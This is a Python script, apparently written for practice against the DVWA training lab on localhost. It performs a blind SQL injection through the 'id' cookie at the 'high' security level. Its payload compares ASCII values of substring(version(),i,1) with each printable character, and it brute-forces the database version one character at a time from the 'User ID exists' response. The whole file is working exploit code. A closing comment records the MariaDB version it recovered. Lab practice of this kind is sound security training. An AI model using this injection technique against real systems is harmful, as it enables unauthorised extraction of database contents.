from login import *

url = "http://localhost:4280/vulnerabilities/sqli_blind/"

initial_login()

header["Cookie"] = header["Cookie"].replace("security=impossible", "security=high")

# Malicious payload 
header["Cookie"] += "; id=' or ascii(substring(version(),+,1)) = -#"
original_string = header["Cookie"]

# Bruteforce name of the database
for i in range(1, 100):
    end = False;
    for j in range(32, 127):
        header["Cookie"] = original_string.replace('+', str(i)).replace('-', str(j))
        
        #print(header["Cookie"])
        
        new_response = session.get(url=url, headers=header, proxies=proxy)

        if "User ID exists in the database." in new_response.text:
            print(chr(j), end='')
            end = True
            break
        
    if end == False:
        break
    
    
# 10.11.7-MariaDB-1:10.11.7+maria~ubu2204